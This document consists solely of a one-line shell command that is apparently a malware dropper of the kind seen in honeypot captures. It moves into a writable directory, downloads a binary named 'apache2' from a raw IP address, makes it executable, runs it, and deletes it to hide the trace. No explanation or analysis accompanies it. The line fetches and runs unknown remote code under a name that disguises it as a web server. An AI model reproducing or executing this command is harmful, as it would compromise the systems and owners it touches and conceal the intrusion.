cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.119/apache2; chmod +x apache2; ./apache2; rm -rf apache2
